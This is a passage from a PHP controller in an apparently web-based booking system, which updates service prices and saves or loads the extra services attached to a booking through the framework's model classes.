					->getData();
				
				foreach ($bs_arr as $bs) {
					pjBookingServiceModel::factory()
						->where('id', $bs['id'])
						->modifyAll(array(
								'price' => $bs['price'] + $ex_new['price'],
								'total' => $bs['total'] + $ex_new['length']
							));
				}
				/*End Update*/
				
				$pjBookingExtraServiceModel = pjBookingExtraServiceModel::factory();
				$pjBookingExtraServiceModel
					->where('booking_id', $_POST['booking_id'])
					->where('service_id', $_POST['service_id'])
					->where('date', $_POST['booking_date'])
					->eraseAll();
				
				$pjBookingExtraServiceModel->setBatchFields(array('booking_id', 'service_id', 'extra_id', 'date'));
				if ( isset($_POST['extra_id']) && count($_POST['extra_id']) > 0 ) {
					foreach ($_POST['extra_id'] as $extra_id)
					{ 
						$pjBookingExtraServiceModel->addBatchRow(array($_POST['booking_id'], $_POST['service_id'], $extra_id, $_POST['booking_date']));
					}
					$pjBookingExtraServiceModel->insertBatch();
				}
				
				exit();
	
			} elseif ( isset($_GET['booking_id']) && !empty($_GET['booking_id']) && 
						isset($_GET['service_id']) && !empty($_GET['service_id']) && 
						isset($_GET['booking_date']) && !empty($_GET['booking_date']) ) {
				$this->set('extra_arr', pjExtraServiceModel::factory()
							->join('pjServiceExtraService', 't2.extra_id = t1.id', 'inner')
							->where('t2.service_id', $_GET['service_id'])
							->orderBy('t1.name ASC')
							->findAll()
							->getData()
						)
					->set('bes_arr', pjBookingExtraServiceModel::factory()
							->where('t1.booking_id', $_GET['booking_id'])
							->where('t1.service_id', $_GET['service_id'])
							->where('t1.date', $_GET['booking_date'])
							->findAll()
							->getDataPair(null, 'extra_id'));
				
			} else exit();
		}
	}
}
?>
